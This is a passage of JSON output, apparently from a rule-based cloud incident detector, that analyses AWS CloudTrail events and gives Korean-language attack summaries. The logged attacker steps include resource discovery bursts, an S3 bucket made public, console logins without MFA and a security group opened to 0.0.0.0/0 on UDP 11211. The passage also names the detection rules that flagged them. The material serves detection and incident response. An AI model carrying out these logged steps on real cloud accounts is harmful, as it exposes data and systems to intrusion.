+      "params": "{\"acl\": [\"\"], \"bucketName\": \"frothlyweb\"}",
+      "userAgent": "signin.amazonaws.com",
+      "awsRegion": "us-west-1"
+     },
+     {
+      "ref": "cloudtrail.json:3665",
+      "ts": "2018-08-20T13:01:31+00:00",
+      "source": "cloudtrail",
+      "action": "s3:GetBucketPolicy",
+      "outcome": "success",
+      "status": "success",
+      "disposition": "none",
+      "src_ip": "107.77.212.175",
+      "rules": [
+       "CT_DISCOVERY_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/bstoll",
+      "access_key": "ASIAZB6T********WYL3",
+      "params": "{\"policy\": [\"\"], \"bucketName\": \"cloudtrail-622676721278\"}",
+      "userAgent": "signin.amazonaws.com",
+      "awsRegion": "us-west-1"
+     },
+     {
+      "ref": "cloudtrail.json:3666",
+      "ts": "2018-08-20T13:01:31+00:00",
+      "source": "cloudtrail",
+      "action": "s3:GetBucketPolicy",
+      "outcome": "failure",
+      "status": "failure",
+      "disposition": "none",
+      "src_ip": "107.77.212.175",
+      "rules": [
+       "CT_DISCOVERY_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/bstoll",
+      "access_key": "ASIAZB6T********BNF4",
+      "errorCode": "NoSuchBucketPolicy",
+      "params": "{\"policy\": [\"\"], \"bucketName\": \"frothlyinvestigations\"}",
+      "userAgent": "signin.amazonaws.com",
+      "awsRegion": "us-west-1"
+     },
+     {
+      "ref": "cloudtrail.json:3667",
+      "ts": "2018-08-20T13:01:31+00:00",
+      "source": "cloudtrail",
+      "action": "s3:GetBucketAcl",
+      "outcome": "success",
+      "status": "success",
+      "disposition": "none",
+      "src_ip": "107.77.212.175",
+      "rules": [
+       "CT_DISCOVERY_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/bstoll",
+      "access_key": "ASIAZB6T********BNF4",
+      "params": "{\"acl\": [\"\"], \"bucketName\": \"frothlyinvestigations\"}",
+      "userAgent": "signin.amazonaws.com",
+      "awsRegion": "us-west-1"
+     },
+     {
+      "ref": "cloudtrail.json:3668",
+      "ts": "2018-08-20T13:01:31+00:00",
+      "source": "cloudtrail",
+      "action": "s3:GetBucketPolicy",
+      "outcome": "success",
+      "status": "success",
+      "disposition": "none",
+      "src_ip": "107.77.212.175",
+      "rules": [
+       "CT_DISCOVERY_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/bstoll",
+      "access_key": "ASIAZB6T********BNF4",
+      "params": "{\"policy\": [\"\"], \"bucketName\": \"frothlyweblogs\"}",
+      "userAgent": "signin.amazonaws.com",
+      "awsRegion": "us-west-1"
+     },
+     {
+      "ref": "cloudtrail.json:3703",
+      "ts": "2018-08-20T13:01:46+00:00",
+      "source": "cloudtrail",
+      "action": "s3:PutBucketAcl",
+      "outcome": "success",
+      "status": "success",
+      "disposition": "none",
+      "src_ip": "107.77.212.175",
+      "rules": [
+       "CT_S3_PUBLIC"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/bstoll",
+      "access_key": "ASIAZB6T********DK5X",
+      "params": "{\"acl\": [\"\"], \"AccessControlPolicy\": {\"AccessControlList\": {\"Grant\": [{\"Grantee\": {\"DisplayName\": \"bstoll\", \"ID\": \"4c018053e740f45beb45f68c0f5eff6347745488ae540130432c9fc64fae310d\", \"xmlns:xsi\": \"http://www.w3.org/2001/XMLSchema-instance\", \"xsi:type\": \"CanonicalUser\"}, \"Permission\": \"FULL_CONTROL\"}, {\"Grantee\": {\"URI\": \"http://acs.amazonaws.com/groups/s3/LogDelivery\", \"xmlns:xsi\": \"http://www.w3.o",
+      "userAgent": "signin.amazonaws.com",
+      "awsRegion": "us-west-1"
+     },
+     {
+      "ref": "cloudtrail.json:4293",
+      "ts": "2018-08-20T13:29:46+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:DescribeInstances",
+      "outcome": "success",
+      "status": "success",
+      "disposition": "none",
+      "src_ip": "107.77.212.175",
+      "rules": [
+       "CT_DISCOVERY_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/bstoll",
+      "access_key": "ASIAZB6T********EHNR",
+      "params": "{\"maxResults\": 1000, \"filterSet\": {}, \"instancesSet\": {}}",
+      "userAgent": "signin.amazonaws.com",
+      "awsRegion": "us-west-1"
+     },
+     {
+      "ref": "cloudtrail.json:4300",
+      "ts": "2018-08-20T13:29:48+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:DescribeInstances",
+      "outcome": "success",
+      "status": "success",
+      "disposition": "none",
+      "src_ip": "107.77.212.175",
+      "rules": [
+       "CT_DISCOVERY_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/bstoll",
+      "access_key": "ASIAZB6T********EHNR",
+      "params": "{\"filterSet\": {}, \"instancesSet\": {\"items\": [{\"instanceId\": \"i-0003b600f157dbc49\"}]}}",
+      "userAgent": "signin.amazonaws.com",
+      "awsRegion": "us-west-1"
+     },
+     {
+      "ref": "cloudtrail.json:4307",
+      "ts": "2018-08-20T13:29:49+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:DescribeInstances",
+      "outcome": "success",
+      "status": "success",
+      "disposition": "none",
+      "src_ip": "107.77.212.175",
+      "rules": [
+       "CT_DISCOVERY_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/bstoll",
+      "access_key": "ASIAZB6T********EHNR",
+      "params": "{\"filterSet\": {}, \"instancesSet\": {\"items\": [{\"instanceId\": \"i-0003b600f157dbc49\"}]}}",
+      "userAgent": "signin.amazonaws.com",
+      "awsRegion": "us-west-1"
+     },
+     {
+      "ref": "cloudtrail.json:4324",
+      "ts": "2018-08-20T13:30:24+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:DescribeInstances",
+      "outcome": "success",
+      "status": "success",
+      "disposition": "none",
+      "src_ip": "107.77.212.175",
+      "rules": [
+       "CT_DISCOVERY_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/bstoll",
+      "access_key": "ASIAZB6T********EHNR",
+      "params": "{\"filterSet\": {}, \"instancesSet\": {\"items\": [{\"instanceId\": \"i-0003b600f157dbc49\"}, {\"instanceId\": \"i-0001456eaca883935\"}]}}",
+      "userAgent": "signin.amazonaws.com",
+      "awsRegion": "us-west-1"
+     },
+     {
+      "ref": "cloudtrail.json:4325",
+      "ts": "2018-08-20T13:30:55+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:DescribeInstances",
+      "outcome": "success",
+      "status": "success",
+      "disposition": "none",
+      "src_ip": "107.77.212.175",
+      "rules": [
+       "CT_DISCOVERY_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/bstoll",
+      "access_key": "ASIAZB6T********EHNR",
+      "params": "{\"filterSet\": {}, \"instancesSet\": {\"items\": [{\"instanceId\": \"i-0001456eaca883935\"}, {\"instanceId\": \"i-0003b600f157dbc49\"}]}}",
+      "userAgent": "signin.amazonaws.com",
+      "awsRegion": "us-west-1"
+     },
+     {
+      "ref": "cloudtrail.json:4331",
+      "ts": "2018-08-20T13:31:26+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:DescribeInstances",
+      "outcome": "success",
+      "status": "success",
+      "disposition": "none",
+      "src_ip": "107.77.212.175",
+      "rules": [
+       "CT_DISCOVERY_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/bstoll",
+      "access_key": "ASIAZB6T********EHNR",
+      "params": "{\"filterSet\": {}, \"instancesSet\": {\"items\": [{\"instanceId\": \"i-0001456eaca883935\"}, {\"instanceId\": \"i-0003b600f157dbc49\"}]}}",
+      "userAgent": "signin.amazonaws.com",
+      "awsRegion": "us-west-1"
+     },
+     {
+      "ref": "cloudtrail.json:4437",
+      "ts": "2018-08-20T13:32:58+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:DescribeSnapshots",
+      "outcome": "success",
+      "status": "success",
+      "disposition": "none",
+      "src_ip": "107.77.212.175",
+      "rules": [
+       "CT_DISCOVERY_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/bstoll",
+      "access_key": "ASIAZB6T********EHNR",
+      "params": "{\"snapshotSet\": {}, \"filterSet\": {}, \"ownersSet\": {}, \"sharedUsersSet\": {\"items\": [{\"user\": \"self\"}]}}",
+      "userAgent": "signin.amazonaws.com",
+      "awsRegion": "us-west-1"
+     },
+     {
+      "ref": "cloudtrail.json:4459",
+      "ts": "2018-08-20T13:33:02+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:DescribeInstances",
+      "outcome": "success",
+      "status": "success",
+      "disposition": "none",
+      "src_ip": "107.77.212.175",
+      "rules": [
+       "CT_DISCOVERY_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/bstoll",
+      "access_key": "ASIAZB6T********EHNR",
+      "params": "{\"maxResults\": 1000, \"filterSet\": {}, \"instancesSet\": {}}",
+      "userAgent": "signin.amazonaws.com",
+      "awsRegion": "us-west-1"
+     },
+     {
+      "ref": "cloudtrail.json:4856",
+      "ts": "2018-08-20T13:57:22+00:00",
+      "source": "cloudtrail",
+      "action": "signin:ConsoleLogin",
+      "outcome": "success",
+      "status": "success",
+      "disposition": "none",
+      "src_ip": "107.77.212.175",
+      "rules": [
+       "CT_CONSOLE_NO_MFA"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/bstoll",
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",
+      "awsRegion": "us-east-1"
+     },
+     {
+      "ref": "cloudtrail.json:5258",
+      "ts": "2018-08-20T14:06:36+00:00",
+      "source": "cloudtrail",
+      "action": "signin:ConsoleLogin",
+      "outcome": "success",
+      "status": "success",
+      "disposition": "none",
+      "src_ip": "107.77.212.175",
+      "rules": [
+       "CT_CONSOLE_NO_MFA"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/bstoll",
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge",
+      "awsRegion": "us-east-1"
+     },
+     {
+      "ref": "cloudtrail.json:5467",
+      "ts": "2018-08-20T14:19:30+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:DescribeSecurityGroups",
+      "outcome": "success",
+      "status": "success",
+      "disposition": "none",
+      "src_ip": "107.77.212.175",
+      "rules": [
+       "CT_DISCOVERY_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/bstoll",
+      "access_key": "ASIAZB6T********K2B2",
+      "params": "{\"filterSet\": {}, \"securityGroupIdSet\": {}, \"securityGroupSet\": {}}",
+      "userAgent": "signin.amazonaws.com",
+      "awsRegion": "us-west-1"
+     },
+     {
+      "ref": "cloudtrail.json:5470",
+      "ts": "2018-08-20T14:19:30+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:DescribeSnapshots",
+      "outcome": "success",
+      "status": "success",
+      "disposition": "none",
+      "src_ip": "107.77.212.175",
+      "rules": [
+       "CT_DISCOVERY_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/bstoll",
+      "access_key": "ASIAZB6T********K2B2",
+      "params": "{\"snapshotSet\": {}, \"filterSet\": {}, \"ownersSet\": {\"items\": [{\"owner\": \"self\"}]}, \"sharedUsersSet\": {}}",
+      "userAgent": "signin.amazonaws.com",
+      "awsRegion": "us-west-1"
+     },
+     {
+      "ref": "cloudtrail.json:5477",
+      "ts": "2018-08-20T14:19:30+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:DescribeInstances",
+      "outcome": "success",
+      "status": "success",
+      "disposition": "none",
+      "src_ip": "107.77.212.175",
+      "rules": [
+       "CT_DISCOVERY_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/bstoll",
+      "access_key": "ASIAZB6T********K2B2",
+      "params": "{\"maxResults\": 1000, \"filterSet\": {}, \"instancesSet\": {}}",
+      "userAgent": "signin.amazonaws.com",
+      "awsRegion": "us-west-1"
+     },
+     {
+      "ref": "cloudtrail.json:5485",
+      "ts": "2018-08-20T14:19:33+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:DescribeInstances",
+      "outcome": "success",
+      "status": "success",
+      "disposition": "none",
+      "src_ip": "107.77.212.175",
+      "rules": [
+       "CT_DISCOVERY_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/bstoll",
+      "access_key": "ASIAZB6T********K2B2",
+      "params": "{\"maxResults\": 1000, \"filterSet\": {}, \"instancesSet\": {}}",
+      "userAgent": "signin.amazonaws.com",
+      "awsRegion": "us-west-1"
+     },
+     {
+      "ref": "cloudtrail.json:5488",
+      "ts": "2018-08-20T14:19:37+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:DescribeImages",
+      "outcome": "success",
+      "status": "success",
+      "disposition": "none",
+      "src_ip": "107.77.212.175",
+      "rules": [
+       "CT_DISCOVERY_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/bstoll",
+      "access_key": "ASIAZB6T********K2B2",
+      "params": "{\"filterSet\": {}, \"ownersSet\": {}, \"imagesSet\": {\"items\": [{\"imageId\": \"ami-0e86606d\"}]}, \"executableBySet\": {}}",
+      "userAgent": "signin.amazonaws.com",
+      "awsRegion": "us-west-1"
+     },
+     {
+      "ref": "cloudtrail.json:5492",
+      "ts": "2018-08-20T14:19:37+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:DescribeInstances",
+      "outcome": "success",
+      "status": "success",
+      "disposition": "none",
+      "src_ip": "107.77.212.175",
+      "rules": [
+       "CT_DISCOVERY_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/bstoll",
+      "access_key": "ASIAZB6T********K2B2",
+      "params": "{\"filterSet\": {}, \"instancesSet\": {\"items\": [{\"instanceId\": \"i-038ae43bc05053694\"}]}}",
+      "userAgent": "signin.amazonaws.com",
+      "awsRegion": "us-west-1"
+     },
+     {
+      "ref": "cloudtrail.json:5502",
+      "ts": "2018-08-20T14:19:49+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:DescribeInstances",
+      "outcome": "success",
+      "status": "success",
+      "disposition": "none",
+      "src_ip": "107.77.212.175",
+      "rules": [
+       "CT_DISCOVERY_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/bstoll",
+      "access_key": "ASIAZB6T********K2B2",
+      "params": "{\"filterSet\": {}, \"instancesSet\": {\"items\": [{\"instanceId\": \"i-038ae43bc05053694\"}, {\"instanceId\": \"i-0920036c8ca91e501\"}, {\"instanceId\": \"i-0cc93bade2b3cba63\"}]}}",
+      "userAgent": "signin.amazonaws.com",
+      "awsRegion": "us-west-1"
+     },
+     {
+      "ref": "cloudtrail.json:5510",
+      "ts": "2018-08-20T14:20:19+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:DescribeInstances",
+      "outcome": "success",
+      "status": "success",
+      "disposition": "none",
+      "src_ip": "107.77.212.175",
+      "rules": [
+       "CT_DISCOVERY_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/bstoll",
+      "access_key": "ASIAZB6T********K2B2",
+      "params": "{\"filterSet\": {}, \"instancesSet\": {\"items\": [{\"instanceId\": \"i-038ae43bc05053694\"}, {\"instanceId\": \"i-0920036c8ca91e501\"}, {\"instanceId\": \"i-0cc93bade2b3cba63\"}]}}",
+      "userAgent": "signin.amazonaws.com",
+      "awsRegion": "us-west-1"
+     },
+     {
+      "ref": "cloudtrail.json:5525",
+      "ts": "2018-08-20T14:20:45+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:DescribeSecurityGroups",
+      "outcome": "success",
+      "status": "success",
+      "disposition": "none",
+      "src_ip": "107.77.212.175",
+      "rules": [
+       "CT_DISCOVERY_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/bstoll",
+      "access_key": "ASIAZB6T********K2B2",
+      "params": "{\"filterSet\": {}, \"securityGroupIdSet\": {}, \"securityGroupSet\": {}}",
+      "userAgent": "signin.amazonaws.com",
+      "awsRegion": "us-west-1"
+     },
+     {
+      "ref": "cloudtrail.json:5533",
+      "ts": "2018-08-20T14:20:50+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:DescribeInstances",
+      "outcome": "success",
+      "status": "success",
+      "disposition": "none",
+      "src_ip": "107.77.212.175",
+      "rules": [
+       "CT_DISCOVERY_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/bstoll",
+      "access_key": "ASIAZB6T********K2B2",
+      "params": "{\"filterSet\": {}, \"instancesSet\": {\"items\": [{\"instanceId\": \"i-038ae43bc05053694\"}, {\"instanceId\": \"i-0920036c8ca91e501\"}, {\"instanceId\": \"i-0cc93bade2b3cba63\"}]}}",
+      "userAgent": "signin.amazonaws.com",
+      "awsRegion": "us-west-1"
+     },
+     {
+      "ref": "cloudtrail.json:5538",
+      "ts": "2018-08-20T14:20:53+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:DescribeInstances",
+      "outcome": "success",
+      "status": "success",
+      "disposition": "none",
+      "src_ip": "107.77.212.175",
+      "rules": [
+       "CT_DISCOVERY_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/bstoll",
+      "access_key": "ASIAZB6T********K2B2",
+      "params": "{\"maxResults\": 1000, \"filterSet\": {}, \"instancesSet\": {}}",
+      "userAgent": "signin.amazonaws.com",
+      "awsRegion": "us-west-1"
+     },
+     {
+      "ref": "cloudtrail.json:5539",
+      "ts": "2018-08-20T14:20:54+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:DescribeSnapshots",
+      "outcome": "success",
+      "status": "success",
+      "disposition": "none",
+      "src_ip": "107.77.212.175",
+      "rules": [
+       "CT_DISCOVERY_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/bstoll",
+      "access_key": "ASIAZB6T********K2B2",
+      "params": "{\"snapshotSet\": {}, \"filterSet\": {}, \"ownersSet\": {}, \"sharedUsersSet\": {\"items\": [{\"user\": \"self\"}]}}",
+      "userAgent": "signin.amazonaws.com",
+      "awsRegion": "us-west-1"
+     }
+    ],
+    "omitted_events": 68,
+    "context": {
+     "n_events": 436,
+     "top_actions": [
+      [
+       "ec2:DescribeInstanceStatus",
+       40
+      ],
+      [
+       "ec2:DescribeVolumes",
+       36
+      ],
+      [
+       "ec2:DescribeVolumeStatus",
+       36
+      ],
+      [
+       "s3:GetBucketAcl",
+       36
+      ],
+      [
+       "s3:GetBucketPolicy",
+       36
+      ],
+      [
+       "ec2:DescribeInstanceAttribute",
+       26
+      ],
+      [
+       "ec2:DescribeTags",
+       24
+      ],
+      [
+       "ec2:DescribeInstanceCreditSpecifications",
+       21
+      ],
+      [
+       "iam:ListInstanceProfiles",
+       21
+      ],
+      [
+       "ec2:DescribeAddresses",
+       18
+      ]
+     ],
+     "sources": {
+      "cloudtrail": 436
+     }
+    },
+    "id": "INC-001",
+    "repeats": 1,
+    "first_seen": "2018-08-20T13:01:28+00:00",
+    "last_seen": "2018-08-20T14:20:54+00:00",
+    "repeat_ids": [],
+    "verdict": "attack",
+    "verdict_by": "rules"
+   },
+   "checks": [],
+   "report": {
+    "summary": "외부 공격으로 보입니다. 08-20 13:01~14:20 UTC(한국 22:01~23:20), 출발지 107.77.212.175: 계정·자원 목록 조회 연속 실행 → S3 버킷을 인터넷 전체 또는 다른 계정에 공개(ACL·정책) → MFA 없는 콘솔 로그인. 공격이 성공한 근거가 28건 있어 피해 범위를 확인해야 합니다(결과: 성공 28건, 실패·차단 2건).",
+    "severity": "high",
+    "confidence": "high",
+    "verdict": "attack",
+    "verdict_reason": "MFA 없는 콘솔 로그인, 계정·자원 목록 조회 연속 실행, S3 버킷을 인터넷 전체 또는 다른 계정에 공개(ACL·정책). 결과: 성공 28건, 실패·차단 2건.",
+    "attack_flow": [
+     {
+      "stage": "discovery",
+      "technique": "T1580",
+      "time": "2018-08-20T13:01:28+00:00",
+      "what": "107.77.212.175에서 계정·자원 목록을 짧은 시간에 83번 조회했습니다(ec2:DescribeInstances 14건, s3:GetBucketPolicy 4건, ec2:DescribeSnapshots 3건). 공격 전 정찰일 수도, 관리 도구의 점검일 수도 있습니다.",
+      "evidence": [
+       "cloudtrail.json:3662",
+       "cloudtrail.json:3663",
+       "cloudtrail.json:3664",
+       "cloudtrail.json:3665",
+       "cloudtrail.json:3666",
+       "cloudtrail.json:3667",
+       "cloudtrail.json:3668",
+       "cloudtrail.json:3669"
+      ]
+     },
+     {
+      "stage": "exfiltration",
+      "technique": "T1537",
+      "time": "2018-08-20T13:01:46+00:00",
+      "what": "107.77.212.175에서 S3 버킷을 누구나 읽거나 쓸 수 있게 공개했습니다.",
+      "evidence": [
+       "cloudtrail.json:3703"
+      ]
+     },
+     {
+      "stage": "initial-access",
+      "technique": "T1078.004",
+      "time": "2018-08-20T13:57:22+00:00",
+      "what": "107.77.212.175에서 MFA 없이 콘솔에 로그인했습니다. 비밀번호만 알면 누구나 들어올 수 있는 상태입니다.",
+      "evidence": [
+       "cloudtrail.json:4856",
+       "cloudtrail.json:5258"
+      ]
+     },
+     {
+      "stage": "discovery",
+      "technique": "T1580",
+      "time": "2018-08-20T14:19:30+00:00",
+      "what": "107.77.212.175에서 계정·자원 목록을 짧은 시간에 12번 조회했습니다(ec2:DescribeInstances 14건, s3:GetBucketPolicy 4건, ec2:DescribeSnapshots 3건). 공격 전 정찰일 수도, 관리 도구의 점검일 수도 있습니다.",
+      "evidence": [
+       "cloudtrail.json:5467",
+       "cloudtrail.json:5470",
+       "cloudtrail.json:5477",
+       "cloudtrail.json:5485",
+       "cloudtrail.json:5488",
+       "cloudtrail.json:5492",
+       "cloudtrail.json:5502",
+       "cloudtrail.json:5510"
+      ]
+     }
+    ],
+    "root_causes": [],
+    "firewall_changes": [],
+    "unknowns": [
+     "규칙 기반 판정이라 공격 의도와 실제 피해 범위는 사람이 확인해야 합니다.",
+     "비슷한 이벤트 68건은 생략하고 대표 이벤트만 보았습니다."
+    ]
+   },
+   "meta": {
+    "mode": "rules",
+    "model": null,
+    "payload_chars": 19266,
+    "validation": {
+     "evidence_total": 19,
+     "evidence_invalid": 0,
+     "steps_without_evidence": 0,
+     "unknown_check_ids": [],
+     "ai_new_changes": [],
+     "passed": true
+    }
+   }
+  },
+  {
+   "incident": {
+    "start": "2018-08-20T15:04:44+00:00",
+    "end": "2018-08-20T15:07:32+00:00",
+    "severity": "high",
+    "score": 372,
+    "stages": [
+     "initial-access",
+     "defense-evasion"
+    ],
+    "src_ips": [
+     "107.77.212.175"
+    ],
+    "instances": [],
+    "actors": [
+     "arn:aws:iam::622676721278:user/bstoll"
+    ],
+    "sources": [
+     "cloudtrail"
+    ],
+    "n_events": 2,
+    "n_known": 0,
+    "known_labels": [],
+    "findings": [
+     {
+      "rule": "CT_CONSOLE_NO_MFA",
+      "technique": "T1078.004",
+      "stage": "initial-access",
+      "title": "MFA 없는 콘솔 로그인",
+      "severity": "low",
+      "detail": "4건(성공 4, 실패·거부 0)",
+      "key": "arn:aws:iam::622676721278:user/bstoll",
+      "first": "2018-08-20T15:04:44+00:00",
+      "last": "2018-08-20T15:04:44+00:00",
+      "n_events": 1,
+      "evidence": [
+       "cloudtrail.json:6401"
+      ]
+     },
+     {
+      "rule": "CT_SG_OPENED",
+      "technique": "T1562.007",
+      "stage": "defense-evasion",
+      "title": "보안그룹·네트워크 ACL을 0.0.0.0/0에 개방",
+      "severity": "high",
+      "detail": "1건(성공 1, 실패·거부 0)",
+      "key": "arn:aws:iam::622676721278:user/bstoll",
+      "first": "2018-08-20T15:07:32+00:00",
+      "last": "2018-08-20T15:07:32+00:00",
+      "n_events": 1,
+      "evidence": [
+       "cloudtrail.json:6455"
+      ]
+     }
+    ],
+    "events": [
+     {
+      "ref": "cloudtrail.json:6401",
+      "ts": "2018-08-20T15:04:44+00:00",
+      "source": "cloudtrail",
+      "action": "signin:ConsoleLogin",
+      "outcome": "success",
+      "status": "success",
+      "disposition": "none",
+      "src_ip": "107.77.212.175",
+      "rules": [
+       "CT_CONSOLE_NO_MFA"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/bstoll",
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",
+      "awsRegion": "us-east-1"
+     },
+     {
+      "ref": "cloudtrail.json:6455",
+      "ts": "2018-08-20T15:07:32+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:AuthorizeSecurityGroupIngress",
+      "outcome": "success",
+      "status": "success",
+      "disposition": "none",
+      "src_ip": "107.77.212.175",
+      "rules": [
+       "CT_SG_OPENED"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/bstoll",
+      "access_key": "ASIAZB6T********EHNR",
+      "params": "{\"groupId\": \"sg-0849cdeb5ef571996\", \"ipPermissions\": {\"items\": [{\"groups\": {}, \"prefixListIds\": {}, \"ipRanges\": {\"items\": [{\"cidrIp\": \"0.0.0.0/0\"}]}, \"fromPort\": 11211, \"ipv6Ranges\": {}, \"toPort\": 11211, \"ipProtocol\": \"udp\"}, {\"groups\": {}, \"prefixListIds\": {}, \"ipRanges\": {}, \"fromPort\": 11211, \"ipv6Ranges\": {\"items\": [{\"cidrIpv6\": \"::/0\"}]}, \"toPort\": 11211, \"ipProtocol\": \"udp\"}]}}",
+      "userAgent": "signin.amazonaws.com",
+      "awsRegion": "us-west-1"
+     }
+    ],
+    "omitted_events": 0,
+    "context": {
+     "n_events": 60,
+     "top_actions": [
+      [
+       "ec2:DescribeSecurityGroups",
+       13
+      ],
+      [
+       "ec2:DescribeTags",
+       6
+      ],
+      [
+       "ec2:DescribeVolumeStatus",
+       5
+      ],
+      [
+       "ec2:DescribeVolumes",
+       5
+      ],
+      [
+       "elasticloadbalancing:DescribeLoadBalancers",
+       4
+      ],
+      [
+       "ec2:DescribeInstanceStatus",
+       3
+      ],
+      [
+       "ec2:DescribeInstances",
+       3
+      ],
+      [
+       "ec2:DescribeSnapshots",
+       3
+      ],
+      [
+       "ec2:DescribeAvailabilityZones",
+       3
+      ],
+      [
+       "ec2:DescribeAccountAttributes",
+       2
+      ]
+     ],
+     "sources": {
+      "cloudtrail": 60
+     }
+    },
+    "id": "INC-002",
+    "repeats": 1,
+    "first_seen": "2018-08-20T15:04:44+00:00",
+    "last_seen": "2018-08-20T15:07:32+00:00",
+    "repeat_ids": [],
+    "verdict": "attack",
+    "verdict_by": "rules"
+   },
+   "checks": [],
+   "report": {
+    "summary": "외부 공격으로 보입니다. 08-20 15:04~15:07 UTC(한국 08-21 00:04~00:07), 출발지 107.77.212.175: MFA 없는 콘솔 로그인 → 보안그룹·네트워크 ACL을 0.0.0.0/0에 개방. 공격이 성공한 근거가 2건 있어 피해 범위를 확인해야 합니다(결과: 성공 2건).",
+    "severity": "high",
+    "confidence": "high",
+    "verdict": "attack",
+    "verdict_reason": "MFA 없는 콘솔 로그인, 보안그룹·네트워크 ACL을 0.0.0.0/0에 개방. 결과: 성공 2건.",
+    "attack_flow": [
+     {
+      "stage": "initial-access",
+      "technique": "T1078.004",
+      "time": "2018-08-20T15:04:44+00:00",
+      "what": "107.77.212.175에서 MFA 없이 콘솔에 로그인했습니다. 비밀번호만 알면 누구나 들어올 수 있는 상태입니다.",
+      "evidence": [
+       "cloudtrail.json:6401"
+      ]
+     },
+     {
+      "stage": "defense-evasion",
+      "technique": "T1562.007",
+      "time": "2018-08-20T15:07:32+00:00",
+      "what": "107.77.212.175에서 보안그룹을 인터넷 전체(0.0.0.0/0)에 열었습니다.",
+      "evidence": [
+       "cloudtrail.json:6455"
+      ]
+     }
+    ],
+    "root_causes": [],
+    "firewall_changes": [],
+    "unknowns": [
+     "규칙 기반 판정이라 공격 의도와 실제 피해 범위는 사람이 확인해야 합니다."
+    ]
+   },
+   "meta": {
+    "mode": "rules",
+    "model": null,
+    "payload_chars": 3047,
+    "validation": {
+     "evidence_total": 2,
+     "evidence_invalid": 0,
+     "steps_without_evidence": 0,
+     "unknown_check_ids": [],
+     "ai_new_changes": [],
+     "passed": true
+    }
+   }
+  },
+  {
+   "incident": {
+    "start": "2018-08-20T09:16:12+00:00",
+    "end": "2018-08-20T09:28:54+00:00",
+    "severity": "high",
+    "score": 329,
+    "stages": [
+     "discovery",
+     "persistence"
+    ],
+    "src_ips": [
+     "139.198.18.205",
+     "35.153.154.221"
+    ],
+    "instances": [],
+    "actors": [
+     "arn:aws:iam::622676721278:user/web_admin"
+    ],
+    "sources": [
+     "cloudtrail"
+    ],
+    "n_events": 233,
+    "n_known": 0,
+    "known_labels": [],
+    "findings": [
+     {
+      "rule": "CT_IAM_PERSISTENCE",
+      "technique": "T1098",
+      "stage": "persistence",
+      "title": "IAM 사용자·키·권한·DB 관리자 비밀번호 생성/변경",
+      "severity": "high",
+      "detail": "2건(성공 0, 실패·거부 2)",
+      "key": "arn:aws:iam::622676721278:user/web_admin",
+      "first": "2018-08-20T09:16:12+00:00",
+      "last": "2018-08-20T09:16:12+00:00",
+      "n_events": 2,
+      "evidence": [
+       "cloudtrail.json:345",
+       "cloudtrail.json:347"
+      ]
+     },
+     {
+      "rule": "CT_ACCESS_DENIED_BURST",
+      "technique": "T1580",
+      "stage": "discovery",
+      "title": "권한 없는 API를 연속 시도(권한 탐색)",
+      "severity": "medium",
+      "detail": "10분 안에 거부 231건, API 5종",
+      "key": "139.198.18.205",
+      "first": "2018-08-20T09:16:16+00:00",
+      "last": "2018-08-20T09:28:54+00:00",
+      "n_events": 231,
+      "evidence": [
+       "cloudtrail.json:352",
+       "cloudtrail.json:353",
+       "cloudtrail.json:354",
+       "cloudtrail.json:355",
+       "cloudtrail.json:356",
+       "cloudtrail.json:358",
+       "cloudtrail.json:359",
+       "cloudtrail.json:360",
+       "cloudtrail.json:361",
+       "cloudtrail.json:388",
